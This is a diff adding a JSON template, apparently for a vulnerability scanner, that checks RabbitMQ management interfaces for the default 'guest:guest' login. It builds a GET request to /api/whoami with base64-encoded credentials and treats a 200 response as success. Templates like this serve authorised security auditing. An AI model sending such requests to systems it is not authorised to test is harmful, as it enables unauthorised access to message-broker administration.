@@ -1,0 +1,35 @@
+{
+  "product": "RabbitMQ",
+  "vul_name": "RabbitMQ 默认口令",
+  "type": "默认口令/弱口令",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "RabbitMQ 默认口令为 guest:guest",
+  "version": "",
+  "note": "",
+  "search": {},
+  "protocol": "http",
+  "link": "",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/api/whoami",
+      "header": {
+        "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q=",
+        "Cookie": "m=2258:Z3Vlc3Q6Z3Vlc3Q%253D"
+      }
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "name"
+        }
+      ]
+    }
+  }
+}
